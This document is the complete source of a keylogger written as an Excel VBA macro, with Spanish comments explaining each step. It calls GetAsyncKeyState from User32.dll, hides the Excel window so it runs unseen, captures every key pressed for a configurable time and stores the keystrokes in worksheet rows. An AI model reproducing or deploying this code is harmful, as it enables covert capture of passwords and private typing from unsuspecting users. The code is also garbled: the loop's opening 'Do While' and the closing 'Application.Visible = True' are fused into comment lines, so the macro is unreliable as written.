'primero declaramos algunas variables que vamos a necesitar más adelante
Dim i, e As Long
Dim s As String
Dim b As Integer
Dim result As Long

'Esta declaración nos permitirá llamar a una función en el User32.dll que nos dirá qué tecla se presiona
Public Declare Function GetAsyncKeyState Lib "User32" (ByVal vKey As Long) As Integer

'Para ejecutar el registrador de claves, ejecutará la macro denominada LoK
Sub loK()
e = 8
b = 0
'Podemos ocultar la aplicación Excel de la vista para ocultar el registrador de claves
Application.Visible = False
'La cantidad de tiempo que se ejecutará el registrador de claves
f = now() + TimeValue(ThisWorkbook.Sheets("set").Range("B1").Text)
'Este bucle se detendrá cuando se alojen los tiempos anterioresDo While now() < f
    'la función GetAsyncKeyState devolverá un valor de -32767 para cualquier tecla que se presione
    'Recorremos en ciclo todas las 255 claves posibles para comprobar cuál tiene un valor de -32767
    For i = 1 To 255
        result = 0
        result = GetAsyncKeyState(i)
        'si encontramos una tecla que está presionada adjuntamos a nuestra cadena
        If result = -32767 Then
            If i = 192 Then
                s = s + "Ñ"
                
            Else
                s = s + Chr$(i)
            End If
        End If
    Next i
        'cada vez que recopilamos x caracteres los pasamos a una nueva columna en la hoja de Excel
        If Len(s) = 50 Then
        Cells(e, 1).Value = s
        'Cada lote de X caracteres se escribe en una nueva fila
        e = e + 1
        s = ""
    End If
Loop

'Cuando expira el tiempo que estableimos anteriormente, escribimos los caracteres Remaing en una nueva fila

Cells(e, 1).Value = s
s = ""
' traemos la aplicación Excel a la vista para que podamos ver el registro de charatersApplication.Visible = True
End Sub
